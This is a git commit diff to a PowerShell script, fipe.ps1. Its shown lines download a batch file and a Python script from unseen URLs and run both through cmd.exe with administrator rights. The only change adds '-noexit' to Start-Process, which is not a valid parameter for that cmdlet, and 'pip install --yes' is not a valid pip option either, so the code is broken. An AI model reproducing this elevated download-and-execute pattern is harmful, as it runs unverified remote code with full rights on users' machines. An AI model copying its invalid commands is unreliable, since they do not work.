b0ecf02d6c7e1a4a6715da3aa94f9a501e3ee35a
FanAPIpipa <156794064+FanAPIpipa@users.noreply.github.com>
2024-01-16 15:26:18 +0300

    Update fipe.ps1

--- fipe.ps1
+++ fipe.ps1
@@ -20,4 +20,4 @@ Invoke-WebRequest -Uri $batFileUrl -OutFile $batFilePath
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c $batFilePath" -Verb RunAs -Wait
 Invoke-WebRequest -Uri $pythonScriptUrl -OutFile $pythonScriptPath
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c pip install --yes pyfiglet" -Verb RunAs -Wait
-Start-Process -FilePath "cmd.exe" -ArgumentList "/K python $pythonScriptPath", "timeout /t 15" -Verb RunAs -Wait
+Start-Process -FilePath "cmd.exe" -ArgumentList "/K python $pythonScriptPath", "timeout /t 15" -Verb RunAs -Wait -noexit
